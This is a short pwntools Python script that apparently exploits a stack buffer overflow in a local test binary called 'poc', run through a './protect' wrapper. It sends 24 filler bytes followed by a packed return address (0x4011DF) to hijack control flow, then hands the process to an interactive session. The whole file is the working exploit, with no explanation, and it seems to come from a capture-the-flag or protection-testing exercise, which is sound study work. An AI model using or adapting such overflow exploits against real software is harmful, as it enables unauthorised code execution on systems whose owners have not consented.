from pwn import *

e = ELF("./poc", checksec=False)
r = process(["/bin/bash", "./protect", "poc"])

payload = b"A" * 24 + p64(0x4011DF)
r.recvuntil(b"input:\n")
r.send(payload)
r.interactive()
